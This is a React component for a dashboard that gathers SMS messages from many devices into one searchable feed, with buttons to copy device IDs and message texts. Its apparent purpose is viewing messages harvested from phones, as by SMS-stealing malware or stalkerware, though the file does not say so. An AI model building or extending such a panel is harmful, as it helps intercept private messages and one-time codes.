"use client";
import React, { useState } from "react";

export default function AllDevicesSmsPanel({ data, showToast }) {
  const [searchQuery, setSearchQuery] = useState("");
  const [limit, setLimit] = useState(30);

  const smsData = data.user_sms || {};
  const devices = data.user_data || {};
  let allFeed = [];

  Object.keys(smsData).forEach((devId) => {
    const msgs = smsData[devId] || {};
    const devInfo = devices[devId] || {};
    const devName = devInfo.d_name || devInfo.Device_info || "Device";

    Object.keys(msgs).forEach((key) => {
      const item = msgs[key];
      if (item && typeof item === "object") {
        const timeVal = item.timestamp || item.date || 0;
        allFeed.push({
          msgId: key,
          deviceId: devId,
          deviceName: devName,
          sender: item.sender || item.address || item.from || "Unknown",
          body: item.body || item.message || item.text || "No Content",
          timestamp: typeof timeVal === "number" ? timeVal : 0,
          dateStr:
            item.date_formatted ||
            (typeof timeVal === "number" && timeVal > 0
              ? new Date(timeVal).toLocaleString()
              : String(item.date || "N/A")),
        });
      }
    });
  });

  allFeed.sort((a, b) => b.timestamp - a.timestamp);

  if (searchQuery.trim()) {
    const q = searchQuery.toLowerCase();
    allFeed = allFeed.filter(
      (m) =>
        m.deviceId.toLowerCase().includes(q) ||
        m.deviceName.toLowerCase().includes(q) ||
        m.sender.toLowerCase().includes(q) ||
        m.body.toLowerCase().includes(q)
    );
  }

  const displayedMessages = allFeed.slice(0, limit);

  const copyText = (text, label) => {
    navigator.clipboard.writeText(text);
    showToast(`📋 Copied ${label}: ${text.slice(0, 20)}`, "success");
  };

  return (
    <div className="panel active">
      <div className="panel-header">
        <div>
          <h2>
            <i className="fas fa-comments" style={{ color: "var(--gold)" }}></i> All Devices Messages Feed
          </h2>
          <p className="panel-sub">Live consolidated stream of SMS from every device</p>
        </div>
        <div className="panel-stats">
          <span className="stat-item">
            <i className="fas fa-envelope-open-text"></i> Total SMS: {allFeed.length}
          </span>
          <span className="stat-item">
            <i className="fas fa-mobile-alt"></i> Devices: {Object.keys(smsData).length}
          </span>
        </div>
      </div>

      <div className="search-container" style={{ marginBottom: 16 }}>
        <i className="fas fa-search search-icon"></i>
        <input
          type="text"
          placeholder="Search by Device ID, Sender, or Text..."
          className="search-input"
          value={searchQuery}
          onChange={(e) => {
            setSearchQuery(e.target.value);
            setLimit(30);
          }}
        />
        {searchQuery && (
          <button
            className="search-clear-btn"
            style={{ display: "block" }}
            onClick={() => setSearchQuery("")}
          >
            <i className="fas fa-times"></i>
          </button>
        )}
      </div>

      <div className="sms-list-luxury" style={{ maxHeight: 650, display: "flex", flexDirection: "column", gap: 10 }}>
        {displayedMessages.length === 0 ? (
          <div className="empty-luxury">
            <i className="fas fa-inbox empty-icon"></i>
            No SMS messages found.
          </div>
        ) : (
          displayedMessages.map((m, index) => (
            <div
              key={m.msgId + "_" + index}
              className="sms-card-luxury"
              style={{
                background: "var(--bg-input)",
                border: "1px solid var(--border-color)",
                borderRadius: "var(--radius-sm)",
                padding: "14px 16px",
                borderLeft: "3px solid var(--gold)",
              }}
            >
              <div
                style={{
                  display: "flex",
                  justifyContent: "space-between",
                  alignItems: "center",
                  flexWrap: "wrap",
                  gap: 8,
                  marginBottom: 8,
                  paddingBottom: 6,
                  borderBottom: "1px solid rgba(255,255,255,0.06)",
                }}
              >
                <div style={{ display: "flex", alignItems: "center", gap: 8, flexWrap: "wrap" }}>
                  <span
                    style={{
                      background: "rgba(212, 175, 55, 0.15)",
                      color: "var(--gold)",
                      padding: "3px 10px",
                      borderRadius: 20,
                      fontSize: 11,
                      fontWeight: 700,
                      display: "inline-flex",
                      alignItems: "center",
                      gap: 4,
                      border: "1px solid rgba(212, 175, 55, 0.3)",
                    }}
                  >
                    <i className="fas fa-mobile-alt"></i> {m.deviceId}
                  </span>

                  <button
                    onClick={() => copyText(m.deviceId, "Device ID")}
                    title="Copy Device ID"
                    style={{
                      background: "transparent",
                      border: "none",
                      color: "var(--text-muted)",
                      cursor: "pointer",
                      fontSize: 12,
                    }}
                  >
                    <i className="fas fa-copy"></i>
                  </button>

                  <span style={{ fontSize: 13, fontWeight: 600, color: "var(--text-primary)" }}>
                    👤 {m.sender}
                  </span>
                </div>

                <div style={{ display: "flex", alignItems: "center", gap: 10 }}>
                  <span style={{ fontSize: 11, color: "var(--text-muted)" }}>
                    <i className="far fa-clock"></i> {m.dateStr}
                  </span>
                  <button
                    onClick={() => copyText(m.body, "Message")}
                    className="btn-sm"
                    style={{
                      background: "rgba(212, 175, 55, 0.1)",
                      color: "var(--gold)",
                      padding: "3px 10px",
                      borderRadius: 6,
                      border: "1px solid rgba(212, 175, 55, 0.2)",
                    }}
                  >
                    <i className="fas fa-copy"></i> Copy SMS
                  </button>
                </div>
              </div>

              <div
                style={{
                  fontSize: 13,
                  lineHeight: 1.5,
                  color: "var(--text-primary)",
                  whiteSpace: "pre-wrap",
                  wordBreak: "break-word",
                }}
              >
                {m.body}
              </div>
            </div>
          ))
        )}
      </div>

      {limit < allFeed.length && (
        <button
          className="btn-load-more"
          onClick={() => setLimit((l) => l + 30)}
          style={{ marginTop: 14 }}
        >
          <i className="fas fa-chevron-down"></i> Load More Messages ({allFeed.length - limit} remaining)
        </button>
      )}
    </div>
  );
}
